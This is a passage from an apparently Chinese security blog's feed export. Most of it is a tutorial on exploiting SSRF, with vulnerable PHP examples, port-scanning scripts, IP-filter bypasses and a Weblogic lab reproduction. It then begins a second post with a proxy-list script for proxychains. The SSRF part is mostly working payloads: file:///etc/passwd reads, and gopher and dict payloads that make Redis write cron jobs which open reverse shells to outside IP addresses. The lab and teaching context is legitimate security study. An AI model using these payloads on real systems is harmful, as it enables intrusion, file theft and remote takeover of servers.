title="判断SSRF漏洞"></a>判断SSRF漏洞</h2><p>通过抓包进行判断</p><p><img src="/2021/05/18/SSRF/d3251a7e-dab9-4dbf-924c-e9ca4966edfa.jpg"></p><p>可以看出是服务器发出的请求，而不是百度服务器发出的请求，可以判断为SSRF漏洞。</p><h3 id="SSRF漏洞相关函数和协议"><a href="#SSRF漏洞相关函数和协议" class="headerlink" title="SSRF漏洞相关函数和协议"></a>SSRF漏洞相关函数和协议</h3><h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><p><code>file_get_contents()</code>、<code>fsockopen()</code>、<code>curl_exec()</code>、<code>fopen()</code>、<code>readfile()</code>等函数使用不当会造成SSRF漏洞</p><h5 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h5><pre><code>&lt;?php$url = $_GET[&#39;url&#39;];;echo file_get_contents($url);?&gt;</code></pre><blockquote><p>file_get_content函数从用户指定的url获取内容，然后指定一个文件名j进行保存，并展示给用户。file_put_content函数把一个字符串写入文件中。</p></blockquote><h5 id="fsockopen"><a href="#fsockopen" class="headerlink" title="fsockopen()"></a>fsockopen()</h5><pre><code>&lt;?phpfunction GetFile($host,$port,$link) &#123;    $fp = fsockopen($host, intval($port), $errno, $errstr, 30);    if (!$fp) &#123;        echo &quot;$errstr (error number $errno) \n&quot;;    &#125; else &#123;        $out = &quot;GET $link HTTP/1.1\r\n&quot;;        $out .= &quot;Host: $host\r\n&quot;;        $out .= &quot;Connection: Close\r\n\r\n&quot;;        $out .= &quot;\r\n&quot;;        fwrite($fp, $out);        $contents=&#39;&#39;;        while (!feof($fp)) &#123;            $contents.= fgets($fp, 1024);        &#125;        fclose($fp);        return $contents;    &#125;&#125;?&gt;</code></pre><blockquote><p><code>fsockopen</code>函数实现对用户指定url数据的获取，该函数使用socket（端口）跟服务器建立tcp连接，传输数据。变量host为主机名，port为端口，errstr表示错误信息将以字符串的信息返回，30为时限</p></blockquote><h5 id="curl-exec"><a href="#curl-exec" class="headerlink" title="curl_exec()"></a>curl_exec()</h5><pre><code>&lt;?phpif (isset($_POST[&#39;url&#39;]))&#123;    $link = $_POST[&#39;url&#39;];    $curlobj = curl_init();// 创建新的 cURL 资源    curl_setopt($curlobj, CURLOPT_POST, 0);    curl_setopt($curlobj,CURLOPT_URL,$link);    curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);// 设置 URL 和相应的选项    $result=curl_exec($curlobj);// 抓取 URL 并把它传递给浏览器    curl_close($curlobj);// 关闭 cURL 资源，并且释放系统资源    $filename = &#39;./curled/&#39;.rand().&#39;.txt&#39;;    file_put_contents($filename, $result);    echo $result;&#125;?&gt;</code></pre><blockquote><p><code>curl_exec</code>函数用于执行指定的cURL会话</p></blockquote><p><strong>注意</strong></p><blockquote><p>1.一般情况下PHP不会开启fopen的gopher wrapper<br>2.file_get_contents的gopher协议不能URL编码<br>3.file_get_contents关于Gopher的302跳转会出现bug，导致利用失败<br>4.curl/libcurl 7.43 上gopher协议存在bug(%00截断) 经测试7.49 可用<br>5.curl_exec() //默认不跟踪跳转，<br>6.file_get_contents() // file_get_contents支持php://input协议</p></blockquote><h4 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h4><p>（1）<code>file</code>： 在有回显的情况下，利用 file 协议可以读取任意内容<br>（2）<code>dict</code>：泄露安装软件版本信息，查看端口，操作内网redis服务等<br>（3）<code>gopher</code>：gopher支持发出GET、POST请求：可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell<br>（4）<code>http/s</code>：探测内网主机存活</p><h2 id="漏洞演示源码"><a href="#漏洞演示源码" class="headerlink" title="漏洞演示源码"></a>漏洞演示源码</h2><p>使用phpstudy环境，ssrf.php直接访问即可。这里演示用了pikachu的环境。</p><pre><code>&lt;?php$url=@$_GET[&#39;url&#39;];$ch=curl_init();//初始化会话curl_setopt($ch, CURLOPT_URL, $url);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$res=curl_exec($ch);//执行会话curl_close($ch);echo $res;//有回显//无回显//if($res)&#123;//    echo &quot;True&quot;;//&#125;else&#123;//    echo &quot;False&quot;;//&#125;?&gt;</code></pre><p>进行访问请求</p><p><img src="/2021/05/18/SSRF/3a3ba2ae-27dc-40d0-9290-5799f3e26afe.png"></p><p>这是一个正常的流程，经常用来访问链接、图片等，同样可以进行漏洞利用</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>SSRF漏洞可以判断内网主机存活以及端口开放情况，可以读取服务器文件，攻击内网redis/memcache/mysql，攻击内网的web应用fastcgi或其他服务等。而gopher协议在其中占了很重要的角色。</p><h3 id="验证漏洞存在"><a href="#验证漏洞存在" class="headerlink" title="验证漏洞存在"></a>验证漏洞存在</h3><h4 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h4><p>即<code>echo $res;</code></p><p>对url参数进行修改，向百度浏览器发送请求。回显百度页面可证实为SSRF漏洞。</p><pre><code>ssrf.php?url=http://www.baidu.com</code></pre><p><img src="/2021/05/18/SSRF/9c23203d-db7f-40ab-9a84-0a6f1131b484.png"></p><h4 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h4><p>即不输出。<code>if($res)&#123; echo &quot;True&quot;; &#125;else&#123; echo &quot;False&quot;; &#125;</code></p><p>因为没有回显无法直观看到页面的变化，只返回True或False判断，采用公网服务器端口监听的方式判断SSRF漏洞是否存在。</p><p>公网服务器nc进行监听，这里在本地模拟公网</p><pre><code>nc -lvp 800</code></pre><p>靶机发送请求</p><pre><code>ssrf.php?url=http://127.0.0.1:800</code></pre><p><img src="/2021/05/18/SSRF/9987f3fd-6fa0-4c4a-be2c-86b11c61ade1.png"></p><p>接收到数据包。可证实存在SSRF漏洞</p><h3 id="本地利用"><a href="#本地利用" class="headerlink" title="本地利用"></a>本地利用</h3><p>以SSRF神器Curl举例，查看 curl 支持的协议列表 <code>curl -V</code>。本地利用方式：</p><pre><code>使用file协议(任意文件读取)curl -vvv file:///etc/passwd使用ftp协议curl -vvv ftp://127.0.0.1:6379/info使用dict协议(操作Redis)curl -vvv &quot;dict://127.0.0.1:6379/info&quot;使用gopher协议(一键反弹Bash)   * 注意: 这里的链接使用单引号，避免$变量问题curl -vvv &#39;gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/103.21.140.84/6789 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a&#39;</code></pre><h3 id="远程利用"><a href="#远程利用" class="headerlink" title="远程利用"></a>远程利用</h3><h4 id="利用http协议"><a href="#利用http协议" class="headerlink" title="利用http协议"></a>利用http协议</h4><h5 id="探测内网存活的主机"><a href="#探测内网存活的主机" class="headerlink" title="探测内网存活的主机"></a>探测内网存活的主机</h5><pre><code>curl -v http://scan.vulspace.com/vul/ssrf/ssrf_get.php?url=http://192.168.52.1curl -v http://scan.vulspace.com/vul/ssrf/ssrf_get.php?url=http://192.168.52.2......</code></pre><p>为了方便，我们可以借助burpsuite的Intruder模块进行爆破，如下所示：</p><p><img src="/2021/05/18/SSRF/73516260-e074-4f5a-9792-aa492f57706c.png"></p><p><img src="/2021/05/18/SSRF/bb6572ce-3ab8-4224-b8c1-8a70d4f0988d.jpg"></p><h5 id="服务探测"><a href="#服务探测" class="headerlink" title="服务探测"></a>服务探测</h5><pre><code>ssrf.php?url=http://127.0.0.1:8080</code></pre><p><img src="/2021/05/18/SSRF/58fb3793-104a-4252-ad9c-31e71562c3b9.jpg"></p><p>如果对资产了解不足，可以先对C段进行探测以及一些端口22，80，8080，7001，6379等，但是灵活度不够，可以编写脚本进行探测。</p><pre><code>#coding=&#39;utf-8&#39;import requestsscheme = &#39;http&#39;port_list = [22,80,3306,3389,6379,8080,8088]def run():    for i in range(130,136):        for port in port_list:            ip=&#39;192.168.197.&#39;+str(i)            payload = &#39;&#123;scheme&#125;://&#123;ip&#125;:&#123;port&#125;&#39;.format(                scheme=scheme,                ip=ip,                port=port            )            url= &quot;http://192.168.197.216/ssrf.php?url=&#123;payload&#125;&quot;.format(payload=payload)            print url            try:                r = requests.get(url,timeout=5,verify=False)                print r.text            except Exception,e:                passif __name__ == &#39;__main__&#39;:    run()</code></pre><p>github上也有现成工具。<br><a href="https://links.jianshu.com/go?to=https://github.com/swisskyrepo/SSRFmap">https://github.com/swisskyrepo/SSRFmap</a><br><a href="https://links.jianshu.com/go?to=https://github.com/bcoles/ssrf_proxy">https://github.com/bcoles/ssrf_proxy</a><br><a href="https://links.jianshu.com/go?to=https://github.com/tarunkant/Gopherus">https://github.com/tarunkant/Gopherus</a></p><h4 id="利用file协议"><a href="#利用file协议" class="headerlink" title="利用file协议"></a>利用file协议</h4><h5 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h5><pre><code>curl -v http://scan.vulspace.com/vul/ssrf/ssrf_get.php?url=file:///etc/passwd</code></pre><p><img src="/2021/05/18/SSRF/9063fa6e-e4af-48c7-8e7b-86b989f0377d.png"></p><h4 id="利用dict协议"><a href="#利用dict协议" class="headerlink" title="利用dict协议"></a>利用dict协议</h4><h5 id="查看端口及端口上运行服务的版本信息"><a href="#查看端口及端口上运行服务的版本信息" class="headerlink" title="查看端口及端口上运行服务的版本信息"></a>查看端口及端口上运行服务的版本信息</h5><pre><code>curl -v http://10.10.10.138/pikachu/vul/ssrf/ssrf_curl.php?url=dict://10.10.10.128:22/info</code></pre><p><img src="/2021/05/18/SSRF/e4447e95-756b-43a0-9af4-212612a42b54.png"></p><h5 id="利用dict协议可以操作redis服务。"><a href="#利用dict协议可以操作redis服务。" class="headerlink" title="利用dict协议可以操作redis服务。"></a>利用dict协议可以操作redis服务。</h5><p>dict协议要一条一条的执行，而gopher协议执行一条命令就行了。</p><p><img src="/2021/05/18/SSRF/d7ca09dd-36c6-405e-bae0-8ad4d5323d21.png"></p><p><img src="/2021/05/18/SSRF/ae003445-920b-4e5e-96e9-19b62555da49.png"></p><p><img src="/2021/05/18/SSRF/e289a076-736d-433a-ae78-6d9ede3362ac.png"></p><h2 id="gopher协议在ssrf中的利用"><a href="#gopher协议在ssrf中的利用" class="headerlink" title="gopher协议在ssrf中的利用"></a>gopher协议在ssrf中的利用</h2><p>SSRF能够利用的协议有很多，如ftp协议、http协议、dict协议、file协议等等，而gopher协议在其中占了很重要的角色，这里重点看一下gopher协议。</p><p>gopher协议，分布型的文件搜集获取网络协议，支持发出GET、POST请求。可以先截获get请求包和post请求包，然后再构造成符合gopher协议的请求。</p><p>服务器nc进行监听</p><pre><code>nc -lvp 2333</code></pre><p>靶机发送请求</p><pre><code>ssrf.php?url=gopher://172.16.111.98:2333/_hello</code></pre><p><img src="/2021/05/18/SSRF/cde3bf9b-528f-4dbc-886e-9f81db8feb9d.jpg"></p><p>SSRF漏洞在真实环境常常去攻击redis、FastCGI等服务。</p><h3 id="攻击内网redis"><a href="#攻击内网redis" class="headerlink" title="攻击内网redis"></a>攻击内网redis</h3><p>当通过ssrf发现内网存在着一些比较脆弱的web服务，比如有存在struts2漏洞的web服务，就可以尝试使用gopher协议把poc发送过去实现rce。</p><p>使用gopher协议发送数据包与常见post数据包不太一样，gopher发送的数据包需为十六进制。</p><h4 id="payloaod生成"><a href="#payloaod生成" class="headerlink" title="payloaod生成"></a>payloaod生成</h4><h5 id="sniffer工具"><a href="#sniffer工具" class="headerlink" title="sniffer工具"></a>sniffer工具</h5><p><a href="https://links.jianshu.com/go?to=https://github.com/firebroo/sec_tools/tree/master/common-gopher-tcp-stream">https://github.com/firebroo/sec_tools/tree/master/common-gopher-tcp-stream</a></p><p>下载到kali上，make编译即可生成sniffer工具。并在本地kali上搭建redis服务，输入info命令查看redis服务，并开启sniffer捕捉到的命令即为payload。</p><p><img src="/2021/05/18/SSRF/c3f3d5e7-287e-4aa3-86da-020d303e0329.jpg"></p><p>gopher协议格式为：<code>gopher:/ip:port/_ + payload</code></p><pre><code>gopher://192.168.197.134:6379/_%2a%31%0d%0a%24%37%0d%0a%43%4f%4d%4d%41%4e%44%0d%0a%2a%31%0d%0a%24%34%0d%0a%69%6e%66%6f%0d%0a</code></pre><p>将该payload拷贝到burp数据包中，响应500错误。</p><p><img src="/2021/05/18/SSRF/9b42c912-b9e7-4f92-b2d0-1f4a01d2b5b3.jpg"></p><p>使用curl进行发送，请求成功。</p><pre><code>curl &#39;gopher://192.168.197.134:6379/_%2a%31%0d%0a%24%37%0d%0a%43%4f%4d%4d%41%4e%44%0d%0a%2a%31%0d%0a%24%34%0d%0a%69%6e%66%6f%0d%0a&#39;</code></pre><p><img src="/2021/05/18/SSRF/f4fdcf42-6937-4687-a8ff-3ff0e1f4015f.jpg"></p><p>证明实际是可以发送成功的。</p><p>下面进一步攻击redis服务。<br> 关于攻击redis服务参考这篇文章 <a href="https://www.jianshu.com/p/2f56a58a1450">redis漏洞利用</a><br> 这里依然写计划任务反弹shell</p><pre><code>config set dir /var/spool/cron/set xxx &quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/47.94.80.xxx/8080 0&gt;&amp;1\n\n&quot;config set dbfilename rootsave</code></pre><p>将反弹shell的命令生成payload进行发送。sniff捕捉payload。</p><p><img src="/2021/05/18/SSRF/80223c3b-0d13-449c-8c9c-8d7e8af75480.jpg"></p><p>payload为：</p><pre><code>%2a%31%0d%0a%24%37%0d%0a%43%4f%4d%4d%41%4e%44%0d%0a%2a%34%0d%0a%24%36%0d%0a%63%6f%6e%66%69%67%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%33%0d%0a%64%69%72%0d%0a%24%31%35%0d%0a%2f%76%61%72%2f%73%70%6f%6f%6c%2f%63%72%6f%6e%0d%0a%2a%33%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%33%0d%0a%78%78%78%0d%0a%24%36%31%0d%0a%0a%0a%2a%2f%31%20%2a%20%2a%20%2a%20%2a%20%2f%62%69%6e%2f%62%61%73%68%20%2d%69%3e%26%2f%64%65%76%2f%74%63%70%2f%34%37%2e%39%34%2e%38%30%2e%31%32%39%2f%38%30%38%30%20%30%3e%26%31%0a%0a%0d%0a%2a%34%0d%0a%24%36%0d%0a%63%6f%6e%66%69%67%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%31%30%0d%0a%64%62%66%69%6c%65%6e%61%6d%65%0d%0a%24%34%0d%0a%72%6f%6f%74%0d%0a%2a%31%0d%0a%24%34%0d%0a%73%61%76%65%0d%0a</code></pre><p>然后使用gopher协议进行构造，并进行url编码。虽然<strong>服务器返回500</strong>，但可以成功创建任务计划执行。</p><pre><code>curl http://www.target.com/ssrf.php?url=gopher://172.16.55.23:6379/_%2a%31%0d%0a%24%37%0d%0a%43%4f%4d%4d%41%4e%44%0d%0a%2a%34%0d%0a%24%36%0d%0a%63%6f%6e%66%69%67%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%33%0d%0a%64%69%72%0d%0a%24%31%35%0d%0a%2f%76%61%72%2f%73%70%6f%6f%6c%2f%63%72%6f%6e%0d%0a%2a%33%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%33%0d%0a%78%78%78%0d%0a%24%36%31%0d%0a%0a%0a%2a%2f%31%20%2a%20%2a%20%2a%20%2a%20%2f%62%69%6e%2f%62%61%73%68%20%2d%69%3e%26%2f%64%65%76%2f%74%63%70%2f%34%37%2e%39%34%2e%38%30%2e%31%32%39%2f%38%30%38%30%20%30%3e%26%31%0a%0a%0d%0a%2a%34%0d%0a%24%36%0d%0a%63%6f%6e%66%69%67%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%31%30%0d%0a%64%62%66%69%6c%65%6e%61%6d%65%0d%0a%24%34%0d%0a%72%6f%6f%74%0d%0a%2a%31%0d%0a%24%34%0d%0a%73%61%76%65%0d%0a</code></pre><p>+OK<br>+OK<br>+OK<br>+OK</p><p><img src="/2021/05/18/SSRF/bac212df-c93a-4fbc-ac09-6d0b2f52f63f.jpg"></p><p>shell随之接收</p><p><img src="/2021/05/18/SSRF/406ca510-3f11-4127-abb8-169b5b4f3dc5.jpg"></p><h5 id="Gopherus工具"><a href="#Gopherus工具" class="headerlink" title="Gopherus工具"></a>Gopherus工具</h5><p>通过<a href="https://github.com/tarunkant/Gopherus">Gopherus</a>生成RESP格式的payload</p><pre><code>python gopherus.py --exploit redisYour gopher link is ready to get Reverse Shell:gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2464%0D%0A%0A%0A%2A/1%20%2A%20%2A%20%2A%20%2A%20bash%20-c%20%22sh%20-i%20%3E%26%20/dev/tcp/127.0.0.1/1234%200%3E%261%22%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2416%0D%0A/var/spool/cron/%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0ABefore sending request plz do `nc -lvp 1234`</code></pre><h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><h3 id="绕过IP限制"><a href="#绕过IP限制" class="headerlink" title="绕过IP限制"></a>绕过IP限制</h3><h3 id="1-利用-、-等符号"><a href="#1-利用-、-等符号" class="headerlink" title="1.利用@、#等符号"></a>1.利用@、#等符号</h3><pre><code>ssrf.php?url=http://www.target.com@10.10.10.10  -&gt;10.10.10.10ssrf.php?url=http://10.10.10.10#www.target.com  -&gt;10.10.10.10ssrf.php?url=http://10。10。10。10               -&gt; 10.10.10.10</code></pre><h3 id="2-利用短地址"><a href="#2-利用短地址" class="headerlink" title="2.利用短地址"></a>2.利用短地址</h3><p> 使用在线短链生成器</p><pre><code>https://url.cn/5fyRNDC</code></pre><h3 id="3-利用特殊域名"><a href="#3-利用特殊域名" class="headerlink" title="3.利用特殊域名"></a>3.利用特殊域名</h3><pre><code>http://127.0.0.1.xip.io/http://127.0.0.1.xip.name/http://www.owasp.org.127.0.0.1.xip.io/http://mysite.10.0.0.1.xip.iohttp://foo.bar.10.0.0.1.xip.io</code></pre><h3 id="4-利用进制转换"><a href="#4-利用进制转换" class="headerlink" title="4.利用进制转换"></a>4.利用进制转换</h3><p>可以是十六进制，八进制等。<br>例如192.168.197.134<br>首先把这四段数字给分别转成16进制，结果：c0 a8 c5 86<br>然后把 c0a8c586 这十六进制一起转换成8进制30052142606<br>记得访问的时候加0表示使用八进制(可以是一个0也可以是多个0）十六进制加0x</p><p><img src="/2021/05/18/SSRF/c250fa39-4d67-47f3-9037-2d4a116fdcc4.png"></p><h3 id="ip编码绕过"><a href="#ip编码绕过" class="headerlink" title="ip编码绕过"></a>ip编码绕过</h3><h3 id="DNS-Rebinding"><a href="#DNS-Rebinding" class="headerlink" title="[DNS Rebinding]"></a>[DNS Rebinding]</h3><p>(<a href="https://github.com/Tr3jer/dnsAutoRebinding">https://github.com/Tr3jer/dnsAutoRebinding</a>)</p><h2 id="weblogic-SSRF漏洞复现"><a href="#weblogic-SSRF漏洞复现" class="headerlink" title="weblogic SSRF漏洞复现"></a>weblogic SSRF漏洞复现</h2><p>使用vluhab进行复现该漏洞。</p><pre><code>docker-compose builddocker-compose up -d</code></pre><p>漏洞存在于/uddiexplorer/SearchPublicRegistries.jsp页面</p><p>burp抓取数据包， operator参数存在SSRF漏洞</p><p><img src="/2021/05/18/SSRF/f740a8fd-ce3d-4062-9f30-2ac7852c5ce5.jpg"></p><p>当访问不存在的端口，返回could not connect over HTTP to server</p><p><img src="/2021/05/18/SSRF/2f69d353-ae2c-4809-8f89-81d660abea68.jpg"></p><p>当访问存在的端口时，显示error code。</p><p><img src="/2021/05/18/SSRF/51f470de-0fd8-4ebd-b126-4712dc3a1bae.jpg"></p><p>当访问的非http协议，则会返回did not have a valid SOAP content-type</p><p>但是当我借助docker的weblogic ssrf漏洞去探测我手动搭建的redis服务时，出现了问题。</p><p>响应<code>Response contained no data</code> ，未找到解决办法。</p><p>去探测docker的redis服务时，响应正常</p><p>利用docker的环境攻击redis服务反弹shell。 向redis发送命令，将shell脚本写进计划任务。</p><pre><code>set 1 &quot;\n\n\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/47.94.xx.xxx/8080 0&gt;&amp;1\n\n\n\n&quot;config set dir /etc/config set dbfilename crontabsave</code></pre><p>将该命令通过get方式进行发送，需要进行url编码。<br> 注意：换行符是”\r\n”，也就是”%0D%0A”</p><pre><code>http://172.18.0.2:6379/%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn%2A%20%2A%20%2A%20%2A%20%2A%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F47.94.xx.xxx%2F8080%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0Aaaa</code></pre><p>注意这里使用的是http协议。因为java不支持除了http、https协议的其他协议。</p><p><img src="/2021/05/18/SSRF/1305c224-87c3-45fc-acbd-33edd298f229.jpg"></p><p>即可反弹shell。</p><p><img src="/2021/05/18/SSRF/d45e91f8-be54-44c9-87e1-3f7a4b66ec38.jpg"></p><p>在自己手动搭建的weblogic和redis环境中，漏洞无法结合利用。<br> 原因未知，复现出来的还请大佬告知。</p><h2 id="防御方式"><a href="#防御方式" class="headerlink" title="防御方式"></a>防御方式</h2><ul><li>过滤返回的信息</li><li>统一错误信息</li><li>限制请求的端口</li><li>禁止不常用的协议</li><li>对DNS Rebinding，考虑使用DNS缓存或者Host白名单</li></ul><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><pre><code>利用F12，查看网站的网络请求利用GoogleHacking,如site:www.baidu.com，然后查找网站是否有关于url的远程调用SSRFmapSSRF-Testing</code></pre><h3 id="靶机环境"><a href="#靶机环境" class="headerlink" title="靶机环境"></a>靶机环境</h3><p><a href="https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf">https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf</a><br><a href="https://github.com/hongriSec/Web-Security-Attack">https://github.com/hongriSec/Web-Security-Attack</a></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://blog.csdn.net/u012206617/article/details/108941738">https://blog.csdn.net/u012206617/article/details/108941738</a><br><a href="https://www.anquanke.com/post/id/197431">https://www.anquanke.com/post/id/197431</a><br><a href="https://www.cnblogs.com/-chenxs/p/11749367.html">https://www.cnblogs.com/-chenxs/p/11749367.html</a><br><a href="https://websec.readthedocs.io/zh/latest/vuln/ssrf.html">https://websec.readthedocs.io/zh/latest/vuln/ssrf.html</a><br><a href="https://segmentfault.com/a/1190000021960060">https://segmentfault.com/a/1190000021960060</a><br><a href="https://joner11234.github.io/article/9d7d2c7d.html">https://joner11234.github.io/article/9d7d2c7d.html</a><br><a href="https://joner11234.github.io/article/9897b513.html">https://joner11234.github.io/article/9897b513.html</a><br><a href="https://github.com/tarunkant/Gopherus">https://github.com/tarunkant/Gopherus</a><br><a href="https://xz.aliyun.com/t/7405">https://xz.aliyun.com/t/7405</a><br><a href="https://blog.csdn.net/qq_41107295/article/details/103026470">https://blog.csdn.net/qq_41107295/article/details/103026470</a><br><a href="https://www.jianshu.com/p/a5ceccfa279a">https://www.jianshu.com/p/a5ceccfa279a</a><br><a href="https://xz.aliyun.com/t/7405">https://xz.aliyun.com/t/7405</a><br><a href="https://skysec.top/2018/08/17/xss-ssrf-redis/#%E5%89%8D%E8%A8%80">https://skysec.top/2018/08/17/xss-ssrf-redis/#%E5%89%8D%E8%A8%80</a></p>]]></content>
      
      
      <categories>
          
          <category> web渗透 </category>
          
          <category> SSRF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSRF </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>getHttpProxy</title>
      <link href="2021/05/18/getHttpProxy/"/>
      <url>2021/05/18/getHttpProxy/</url>
      
        <content type="html"><![CDATA[<p>在github上发现一个自动更新的http代理的仓库<a href="https://github.com/fate0/proxylist">fate0</a></p><p>下面python脚本实现自动获取并添加到proxychains.conf配置文件中</p><p>[getHttp.py]</p><pre><code>#!/usr/bin/env python3# -*- coding: utf-8 -*-# AUTHOR: Mangolins# Description:#      自动获取http代理，并添加到proxychains.conf中#Usage:#      python3 gethttp.py import requestsimport urllib3import jsonimport sysimport shutildef get_socks5(proxychains_path):    &quot;&quot;&quot;    get socks from http://proxylist.fatezero.org/proxy.list.    proxychains_path: str -&gt; the path of proxycahins-ng configuation file.    ***suggestion:   enable  round_robin_chain****    #strict_chain    #dynamic_chain    #round_robin_chain    random_chain    chain_len = 2    &quot;&quot;&quot;    proxychains_file = proxychains_path    url=&quot;http://proxylist.fatezero.org/proxy.list&quot;    headers=&#123;        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36&quot;    &#125;    urllib3.disable_warnings()     try:        response = requests.get(url=url,headers=headers,verify=False,timeout=10)    except Exception as e:        print(e)        exit()    if response.status_code == 200 :        proxy_list = response.text.splitlines()        socks_list=&quot;\n\n# socks5 list from  http://proxylist.fatezero.org/proxy.list\n&quot;        for item in proxy_list:            item_dict = json.loads(item)            if &quot;http&quot; == item_dict[&#39;type&#39;] and &quot;high_anonymous&quot; == item_dict[&#39;anonymity&#39;]:                try:                    httpurl=&#39;http://&#39;+item_dict[&#39;host&#39;] + &#39;:&#39; + str(item_dict[&#39;port&#39;])                    httpresponse = requests.get(url=httpurl,verify=False,timeout=2)                    if httpresponse.status_code == 200:                        socks_item = item_dict[&#39;type&#39;] +&quot;\t&quot; + item_dict[&#39;host&#39;] + &quot;\t&quot; + str(item_dict[&#39;port&#39;])+&quot;\n&quot;                        socks_list += socks_item                except Exception as e:                    print(e)        print(socks_list)        with open(proxychains_file,&quot;a+&quot;) as f:            f.write(socks_list)if __name__ == &#39;__main__&#39;:    shutil.copy(&quot;/etc/proxychains.conf.bak&quot;,&quot;/etc/proxychains.conf&quot;)    if sys.argv.__len__() == 1:        get_socks5(&quot;/etc/proxychains.conf&quot;)    else:        get_socks5(sys.argv[1])&lt;/pre&gt;</code></pre><p>执行脚本后，代理效果很差，基本上都不能用。</p><pre><code># python3 getHttp.py HTTPConnectionPool(host=&#39;3.95.126.46&#39;, port=80): Max retries exceeded with url: / (Caused by ConnectTimeoutError(&lt;urllib3.connection.HTTPConnection object at 0x7f6693a0cf40&gt;, &#39;Connection to 3.95.126.46 timed out. (connect timeout=2)&#39;))HTTPConnectionPool(host=&#39;51.222.197.194&#39;, port=32769): Max retries exceeded with url: / (Caused by ConnectTimeoutError(&lt;urllib3.connection.HTTPConnection object at 0x7f6693989970&gt;, &#39;Connection to 51.222.197.194 timed out. (connect timeout=2)&#39;))HTTPConnectionPool(host=&#39;82.223.21.37&#39;, port=80): Read timed out. (read timeout=2)HTTPConnectionPool(host=&#39;23.91.96.251&#39;, port=80): Max retries exceeded with url: / (Caused by ConnectTimeoutError(&lt;urllib3.connection.HTTPConnection object at 0x7f6693a0cfd0&gt;, &#39;Connection to 23.91.96.251 timed out. (connect timeout=2)&#39;))HTTPConnectionPool(host=&#39;80.48.119.28&#39;, port=8080): Max retries exceeded with url: / (Caused by ConnectTimeoutError(&lt;urllib3.connection.HTTPConnection object at 0x7f6693992580&gt;, &#39;Connection to 80.48.119.28 timed out. (connect timeout=2)&#39;))HTTPConnectionPool(host=&#39;212.96.121.90&#39;, port=8080): Read timed out. (read timeout=2)HTTPConnectionPool(host=&#39;52.78.172.171&#39;, port=80): Max retries exceeded with url: / (Caused by ConnectTimeoutError(&lt;urllib3.connection.HTTPConnection object at 0x7f66939a6610&gt;, &#39;Connection to 52.78.172.171 timed out. (connect timeout=2)&#39;))HTTPConnectionPool(host=&#39;129.204.182.65&#39;, port=9999): Read timed out. (read timeout=2)HTTPConnectionPool(host=&#39;51.222.197.146&#39;, port=32769): Max retries exceeded with url: / (Caused by ConnectTimeoutError(&lt;urllib3.connection.HTTPConnection object at 0x7f6693989370&gt;, &#39;Connection to 51.222.197.146 timed out. (connect timeout=2)&#39;))HTTPConnectionPool(host=&#39;51.222.197.157&#39;, port=32769): Max retries exceeded with url: / (Caused by ConnectTimeoutError(&lt;urllib3.connection.HTTPConnection object at 0x7f6693989400&gt;, &#39;Connection to 51.222.197.157 timed out. (connect timeout=2)&#39;))HTTPConnectionPool(host=&#39;51.222.197.192&#39;, port=32769): Max retries exceeded with url: / (Caused by ConnectTimeoutError(&lt;urllib3.connection.HTTPConnection object at 0x7f6693a0c820&gt;, &#39;Connection to 51.222.197.192 timed out. (connect 